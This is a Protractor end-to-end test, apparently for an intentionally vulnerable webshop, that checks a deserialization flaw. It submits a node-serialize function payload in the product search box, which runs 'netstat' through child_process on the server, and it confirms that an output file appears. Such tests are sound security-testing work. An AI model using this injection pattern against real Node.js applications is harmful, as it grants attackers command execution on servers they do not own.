'use strict';
const path = require('path');
const HelperFunctions = require('../helperFunctions.js');
const glob = require("glob");

describe('Deserialization - Deserialization Bug', function () {

    beforeEach(function () {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Try to run netstat command', function () {

        beforeEach(function() {
            browser.get(browser.params.webshop);
        });

        it('should be successfully', function () {
            let fileName = 'deserializationBug.txt';

            //Fill form
            element(by.model('productSearch.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
            browser.actions().sendKeys(protractor.Key.ENTER).perform();

            let filePath = '../../../' + fileName;

            browser.driver.wait(() => {
                let filesArray = glob.sync(path.join(__dirname, filePath));
                if (typeof filesArray !== 'undefined' && filesArray.length > 0) {
                    return filesArray;
                }
            }, 5000).then((filesArray) => {
                expect(filesArray[0]).toContain(fileName);
            });
        });
    });
});
